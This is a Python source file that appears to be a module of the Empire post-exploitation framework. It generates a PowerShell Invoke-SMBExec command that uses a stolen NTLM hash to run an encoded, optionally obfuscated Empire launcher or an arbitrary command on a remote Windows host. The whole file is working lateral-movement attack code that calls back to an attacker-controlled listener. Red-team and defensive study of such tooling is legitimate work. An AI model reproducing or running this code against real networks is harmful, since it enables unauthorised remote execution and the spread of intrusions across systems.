from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        command = params["Command"]
        computer_name = params["ComputerName"]
        user_name = params["Username"]
        ntlm_hash = params["Hash"]
        domain = params["Domain"]
        params["Service"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # Only "Command" or "Listener" but not both
        if listener_name == "" and command == "":
            raise ModuleValidationException("Listener or Command required")
        if listener_name and command:
            raise ModuleValidationException(
                "[!] Cannot use Listener and Command at the same time"
            )

        if (
            not main_menu.listenersv2.get_active_listener_by_name(listener_name)
            and not command
        ):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        if listener_name:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                user_agent=user_agent,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )

            if launcher == "":
                raise ModuleValidationException("Error in launcher generation.")

            Cmd = (
                "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
                + launcher
            )

        else:
            Cmd = "%COMSPEC% /C start /b " + command

        script_end = f"Invoke-SMBExec -Target {computer_name} -Username {user_name} -Domain {domain} -Hash {ntlm_hash} -Command '{Cmd}'"
        outputf = params.get("OutputFunction", "Out-String")
        script_end += (
            f" | {outputf} | "
            + '%{$_ + "`n"};"`n'
            + str(module.name.split("/")[-1])
            + ' completed!"'
        )

        return script, script_end
